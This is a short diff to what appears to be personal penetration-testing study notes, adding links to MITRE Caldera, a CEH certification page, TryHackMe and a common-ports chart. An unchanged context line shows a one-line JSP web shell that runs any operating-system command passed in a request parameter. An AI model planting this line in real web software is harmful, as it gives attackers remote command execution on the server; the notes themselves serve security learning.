@@ -119,6 +119,10 @@ same is JSP
 `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
 ## LINKS
 
+### Caldera ig - [Caldera](https://caldera.mitre.org/)
+
+### May want this cert - [CEH Cert](https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh-v13-north-america/)
+
 ### Try "Try Hack Me" - [Try HACK Me](https://tryhackme.com/pricing)
 
 ### Common Ports - [Wayback Machine](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf)
